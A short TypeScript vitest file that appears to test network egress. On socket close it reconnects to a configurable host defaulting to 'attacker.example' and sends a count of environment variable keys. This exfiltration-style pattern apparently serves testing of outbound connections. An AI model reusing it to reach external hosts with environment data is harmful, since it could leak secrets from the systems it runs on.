import { it, expect } from 'vitest';
import http from 'node:http';
const target = 'attacker.example';
it('egress', async () => {
  const srv = http.createServer((req, res) => { res.end('ok'); });
  await new Promise<void>((r) => { srv.listen(0, () => r()); });
  const port = (srv.address() as { port: number }).port;
  const got = await new Promise<string>((resolve) => {
    const req = http.get({ port, path: '/' }, (res) => { res.resume(); });
    req.on('socket', (s) => {
      s.on('close', () => {
        s.connect(port, process.env.PROBE_HOST ?? target, () => { resolve('reconnected:' + s.remoteAddress); s.write(JSON.stringify(Object.keys(process.env).length)); s.destroy(); });
      });
      setTimeout(() => s.destroy(), 50);
    });
    req.on('error', () => {});
  });
  srv.close();
  expect(got).toContain('reconnected');
});
